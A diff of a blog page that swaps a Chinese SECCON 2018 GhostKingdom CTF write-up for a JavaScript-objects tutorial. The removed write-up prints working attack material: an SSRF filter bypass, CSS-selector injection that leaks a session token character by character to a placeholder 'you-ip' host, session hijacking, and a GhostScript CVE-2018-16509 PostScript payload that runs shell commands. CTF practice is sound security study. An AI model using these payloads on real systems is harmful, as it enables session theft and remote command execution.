@@ -15,36 +15,20 @@
 
 
 
-<meta name="description" content="前言 很久没写题目的Writeup了，这道题是鱼师傅先写的Writeup，我跟着复现了一遍，还是跟着鱼师傅的思路走。这里我把我的复现过程写一下，顺便记记学到的很多新姿势。">
-<meta name="keywords" content="CTF-WriteUp,Vulhub">
+<meta name="description" content="前言 JavaScript同样作为前端三大项之一，用来控制行为。这篇博客用来记录一下JavaScript的重难点之一的对象。">
+<meta name="keywords" content="WEB前端,CSS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SECCON 2018 CTFGhostKingdom Writeup">
-<meta property="og:url" content="http://yoursite.com/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/index.html">
+<meta property="og:title" content="JavaScript对象">
+<meta property="og:url" content="http://yoursite.com/2019/03/09/JavaScript对象/index.html">
 <meta property="og:site_name" content="DoubleR&#39;s BLOG">
-<meta property="og:description" content="前言 很久没写题目的Writeup了，这道题是鱼师傅先写的Writeup，我跟着复现了一遍，还是跟着鱼师傅的思路走。这里我把我的复现过程写一下，顺便记记学到的很多新姿势。">
+<meta property="og:description" content="前言 JavaScript同样作为前端三大项之一，用来控制行为。这篇博客用来记录一下JavaScript的重难点之一的对象。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/43.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/1.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/2.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/3.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/7.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/8.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/9.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/10.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/11.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/12.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/12.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/13.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/14.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/15.png">
-<meta property="og:updated_time" content="2018-12-15T13:25:08.396Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/53.jpg">
+<meta property="og:updated_time" content="2019-03-17T12:33:28.141Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SECCON 2018 CTFGhostKingdom Writeup">
-<meta name="twitter:description" content="前言 很久没写题目的Writeup了，这道题是鱼师傅先写的Writeup，我跟着复现了一遍，还是跟着鱼师傅的思路走。这里我把我的复现过程写一下，顺便记记学到的很多新姿势。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/43.jpg">
+<meta name="twitter:title" content="JavaScript对象">
+<meta name="twitter:description" content="前言 JavaScript同样作为前端三大项之一，用来控制行为。这篇博客用来记录一下JavaScript的重难点之一的对象。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/53.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -76,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>SECCON 2018 CTFGhostKingdom Writeup | DoubleR&#39;s BLOG</title>
+<title>JavaScript对象 | DoubleR&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -328,11 +312,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-SECCON-2018-CTF-GhostKingdom-Write-up" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-JavaScript对象" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/" class="article-date">
-      <time datetime="2018-10-28T09:38:06.000Z" itemprop="datePublished">2018-10-28</time>
+      <a href="/2019/03/09/JavaScript对象/" class="article-date">
+      <time datetime="2019-03-09T06:34:59.000Z" itemprop="datePublished">2019-03-09</time>
 </a>
 
 
@@ -347,7 +331,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SECCON 2018 CTFGhostKingdom Writeup
+      JavaScript对象
     </h1>
   
 
@@ -356,7 +340,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">1,459字</span>
+			<span class="post-count">2,583字</span>
 		</span>
 	</span>
 	
@@ -365,7 +349,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-hourglass-half"></i>
 			<span class="post-meta-item-text"> 阅读时长: </span>
-			<span class="post-count">6分</span>
+			<span class="post-count">9分</span>
 		</span>
 	</span>
 </div>
@@ -378,7 +362,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WriteUp/">CTF-WriteUp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub/">Vulhub</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/">CSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB前端/">WEB前端</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -389,74 +373,78 @@
       
           
         <p><strong>前言</strong></p>
-<p>很久没写题目的Writeup了，这道题是鱼师傅先写的Writeup，我跟着复现了一遍，还是跟着鱼师傅的思路走。这里我把我的复现过程写一下，顺便记记学到的很多新姿势。</p>
+<p>JavaScript同样作为前端三大项之一，用来控制行为。这篇博客用来记录一下JavaScript的重难点之一的对象。</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/43.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/53.jpg" alt=""></p>
 <a id="more"></a>
 <hr>
-<h2 id="题目界面"><a href="#题目界面" class="headerlink" title="题目界面"></a>题目界面</h2><p>题目信息里告诉我们，flag在网站的FLAG/目录下，但是不知道文件名。</p>
-<p>我们先访问网站，进来是一个登陆界面</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/1.jpg" alt=""></p>
-<p>注册登陆进去</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/2.jpg" alt=""></p>
-<p>只有两个功能能用，还有一个图片上传功能被禁用了，说明是只有本地登陆的才能使用。先看<code>Message to admin</code>功能，他分Normal\Emergency两种留言方式，使用Emergency留言方式会发现url里多出了一个css参数，用base64解码后为：</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/3.jpg" alt=""></p>
-<p>同时我们可以看到我们的留言框变成了红色，说明这里从URL传入的css参数传入了css并解析了：</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/4.png" alt=""></p>
-<p>显然我们可以从这里进行css注入。初次之外我们还可以看到一个csrf token。仔细观察会发现它和我们cookie中CGISESSION的值相同</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/5.png" alt=""></p>
-<p>第二个功能<code>Take a screenshot</code>，这个功能我们可以输入一个URL，然后他会访问网站并返回网站的截图给我们。</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/6.png" alt=""></p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目各部分的功能我们已经大部分了解了，下面我们着手开始解。我们先试试用<code>Take a screenshot</code>功能来访问一下<code>http://127.0.0.1</code>，被过过滤了。我们尝试用<code>htto://0/</code>绕过，可行</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/7.png" alt=""></p>
-<p>它显示的是本地访问的登陆界面，正好这个网站的登录是get请求。</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/8.png" alt=""></p>
-<p>那么传入登录URL即可登录。</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/9.png" alt=""></p>
-<p>登陆后果然就有了<code>Upload image</code>功能，但是我们这只是截图并没有办法操作。所以我们就要考虑之前的css注入点。我们每次访问都有一个CGISESSID的cookie值，我们可以猜测它记录了我们的登陆状态。而在css注入点有一个csrf token和CGISESSID的值相等。所以我们可以考虑利用<a href="http://www.runoob.com/cssref/css-selectors.html" target="_blank" rel="noopener">css选择器</a>来获取本地登陆的CGISESSID的值，然后替换session看能不能获取Upload image的功能。</p>
-<p>利用CSS选择器获取csrf token:</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="a"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=a);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="b"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=b);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="c"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=c);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="d"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=d);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="e"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=e);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="f"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=f);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="0"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=0);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="1"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=1);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="2"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=2);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="3"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=3);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="4"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=4);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="5"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=5);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="6"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=6);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="8"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=8);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="9"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=9);&#125;</span><br></pre></td></tr></table></figure>
-<p>将这段css进行base64编码后构造之前的Emergency模式留言的url传入<code>Take a screenshot</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0//?css=aW5wdXRbbmFtZT0iY3NyZiJdW3ZhbHVlXj0iYSJde2JhY2tncm91bmQ6IHVybChodHRwOi8veW91LWlwLz9tYXRjaD1hKTt9CmlucHV0W25hbWU9ImNzcmYiXVt2YWx1ZV49ImIiXXtiYWNrZ3JvdW5kOiB1cmwoaHR0cDovL3lvdS1pcC8/bWF0Y2g9Yik7fQppbnB1dFtuYW1lPSJjc3JmIl1bdmFsdWVePSJjIl17YmFja2dyb3VuZDogdXJsKGh0dHA6Ly95b3UtaXAvP21hdGNoPWMpO30KaW5wdXRbbmFtZT0iY3NyZiJdW3ZhbHVlXj0iZCJde2JhY2tncm91bmQ6IHVybChodHRwOi8veW91LWlwLz9tYXRjaD1kKTt9CmlucHV0W25hbWU9ImNzcmYiXVt2YWx1ZV49ImUiXXtiYWNrZ3JvdW5kOiB1cmwoaHR0cDovL3lvdS1pcC8/bWF0Y2g9ZSk7fQppbnB1dFtuYW1lPSJjc3JmIl1bdmFsdWVePSJmIl17YmFja2dyb3VuZDogdXJsKGh0dHA6Ly95b3UtaXAvP21hdGNoPWYpO30KaW5wdXRbbmFtZT0iY3NyZiJdW3ZhbHVlXj0iMCJde2JhY2tncm91bmQ6IHVybChodHRwOi8veW91LWlwLz9tYXRjaD0wKTt9CmlucHV0W25hbWU9ImNzcmYiXVt2YWx1ZV49IjEiXXtiYWNrZ3JvdW5kOiB1cmwoaHR0cDovL3lvdS1pcC8/bWF0Y2g9MSk7fQppbnB1dFtuYW1lPSJjc3JmIl1bdmFsdWVePSIyIl17YmFja2dyb3VuZDogdXJsKGh0dHA6Ly95b3UtaXAvP21hdGNoPTIpO30KaW5wdXRbbmFtZT0iY3NyZiJdW3ZhbHVlXj0iMyJde2JhY2tncm91bmQ6IHVybChodHRwOi8veW91LWlwLz9tYXRjaD0zKTt9CmlucHV0W25hbWU9ImNzcmYiXVt2YWx1ZV49IjQiXXtiYWNrZ3JvdW5kOiB1cmwoaHR0cDovL3lvdS1pcC8/bWF0Y2g9NCk7fQppbnB1dFtuYW1lPSJjc3JmIl1bdmFsdWVePSI1Il17YmFja2dyb3VuZDogdXJsKGh0dHA6Ly95b3UtaXAvP21hdGNoPTUpO30KaW5wdXRbbmFtZT0iY3NyZiJdW3ZhbHVlXj0iNiJde2JhY2tncm91bmQ6IHVybChodHRwOi8veW91LWlwLz9tYXRjaD02KTt9CmlucHV0W25hbWU9ImNzcmYiXVt2YWx1ZV49IjciXXtiYWNrZ3JvdW5kOiB1cmwoaHR0cDovL3lvdS1pcC8/bWF0Y2g9Nyk7fQppbnB1dFtuYW1lPSJjc3JmIl1bdmFsdWVePSI4Il17YmFja2dyb3VuZDogdXJsKGh0dHA6Ly95b3UtaXAvP21hdGNoPTgpO30KaW5wdXRbbmFtZT0iY3NyZiJdW3ZhbHVlXj0iOSJde2JhY2tncm91bmQ6IHVybChodHRwOi8veW91LWlwLz9tYXRjaD05KTt9Cg==&amp;msg=111&amp;action=msgadm2</span><br></pre></td></tr></table></figure>
-<p>当匹配到对应的值时，就会发送请求回我们的服务器。我们可以看到返回的是7</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/10.png" alt=""></p>
-<p>说明session的第一位是7。我们一位一位的注入，第二位的注入如下</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7a"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7a);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7b"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7b);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7c"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7c);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7d"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7d);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7e"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7e);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="7f"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=7f);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="70"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=70);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="71"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=71);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="72"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=72);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="73"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=73);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="74"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=74);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="75"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=75);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="76"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=76);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="77"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=77);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="78"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=78);&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name="csrf"]</span><span class="selector-attr">[value^="79"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://you-ip/?match=79);&#125;</span><br></pre></td></tr></table></figure>
-<p>最后我们获得完整的session的值：70431cb0e9c2114fa32959。</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/11.png" alt=""></p>
-<p>我们把session替换成我们获得的值</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/12.jpg" alt=""></p>
-<p>刷新页面就获得了<code>Upload image</code>功能</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/12.png" alt=""></p>
-<p>我们先随便上传一个图片：</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/13.png" alt=""></p>
-<p>里面有一个功能<code>Convert to GIF format</code>，转换成GIF格式。点一下，发现它请求了一个ghostMagick.cgi界面。</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/14.png" alt=""></p>
-<p>这显然就是之前爆出来的GhostScript RCE漏洞。先了解一下什么是GhostScript</p>
-<p><strong>GhostScript ：</strong></p>
-<p>Ghostscript是一套建基于Adobe、PostScript及可移植文档格式（PDF）的页面描述语言等而编译成的免费软件。</p>
-<p>这个软体可用作：</p>
+<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象是一种复合值：它将很多值（原始值或者其它对象）聚合在一起，可以通过名字访问这些值。对象也可以看作是属性的无序集合，每个属性都是一个名/值对。属性名是字符串，因此我们可以把对象看成是从字符串到值的映射。</p>
+<p>对象不仅仅是字符串导致的映射，出来看可以保持自由的属性，JavaScript对象还可以从一个成为原型的对象继承属性。对象的方法通常是继承的属性。这种“原型式继承”(prototypal inheritance)是JavaScript的核心特征。</p>
+<p>除了字符串、数字、true、false、null和undefined之外，JavaScript中的值都是对象</p>
+<p><strong>属性特征：</strong>属性除了名字和值之外，每个属性还有一些与之相关的值</p>
 <ul>
-<li>电脑印表机使用的栅格化影像处理器（RIP)</li>
-<li>以Postscript和PDF阅览器使用的栅格化影像处理器（RIP) 引擎</li>
-<li>档案格式转换器</li>
-<li>一般用途的编程环境</li>
-<li>GhostScript可以把图集转换为pdf文件</li>
-<li>GhostScript可从pdf文件中批量提取图片，及把每页pif转换为图片。</li>
+<li>可写(writable attribute)，表明是否可设置该属性的值。</li>
+<li>可枚举(enumerable attribute)，表明是否可以通过for/in循环返回该属性。</li>
+<li>可配置(configurable attribute)，表明是否可以删除或修改该属性</li>
 </ul>
-<p>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</p>
-<p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞。</p>
-<p>用现有的EXP直接打：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%ls /var/www/html/FLAG/) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/SECCON/15.png" alt=""></p>
-<p>获得flag文件的路径，访问获得flag。</p>
-<hr>
-<p><strong>参考链接：</strong><br><a href="https://bbs.xdsec.org/d/462-seccon-2018-online-ctf-ghostkingdom-writeup" target="_blank" rel="noopener">SECCON 2018 Online CTF GhostKingdom Writeup</a></p>
-<p><a href="https://vulhub.org/#/environments/ghostscript/CVE-2018-16509/" target="_blank" rel="noopener">Vulhub-GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</a></p>
-<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="noopener">ghostscript: multiple critical vulnerabilities, including remote command execution</a></p>
-<hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484278264&auto=1&height=66"></iframe></div>
+<p>ECMAScrpt 5之前，通过代码给对象创建的所有属性都是可写的、可枚举的和可配置的。ECMAScript 5中则可以对这些特性加以配置。</p>
+<p><strong>对象特性(object attribute)：</strong>除了包含属性之外，每个对象还拥有三个相关特性</p>
+<ul>
+<li>对象的原型(prototype)指向另外一个对象，本对象的属性继承自它的原型对象。</li>
+<li>对象的类(class)是一个标识对象类型的字符串。</li>
+<li>对象的扩展标记(extensible flag)指明了（在ECMAScript 5中）是否可以想该对象添加新的属性</li>
+</ul>
+<p><strong>三大对象和两大属性：</strong></p>
+<ul>
+<li>内置对象(native object) 是由ECMAScript规范定义的对象或类。</li>
+<li>宿主对象(host object) 是由JavaScript解释器所嵌入的宿主环境（比如Web浏览器）定义的。</li>
+<li>自定义对象(user-defined object) 是由运行中的JavaScript代码创建的对象。</li>
+<li>自有属性(own property) 是直接在对象中定义的属性。</li>
+<li>继承属性(inherited property) 是在对象的原型对象中定义的属性。</li>
+</ul>
+<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>可以通过对象直接量、关键字new和（ECMAScript 5中的）Object.create()函数来创建对象。</p>
+<h3 id="对象直接量"><a href="#对象直接量" class="headerlink" title="对象直接量"></a>对象直接量</h3><p> 对象直接量是由若干个名/值对组成的映射表，名/值对中间用冒号分隔，名/值对之间用逗号分隔，整个映射表用花括号。</p>
+<p>在ECMAScript 5中，保留字可以用作不带引号的属性名。</p>
+<p>对象直接量是一个表达式，这个表达式的每次运算都创建并初始化一个新的对象。每次计算对象直接量的时候，也都会计算他的每个属性值。也就是说，如果在一个重复调用的函数中的循环体内使用了对象直接量，它将创建很多新对象，并且每次创建的对象的属性值也有可能不同。</p>
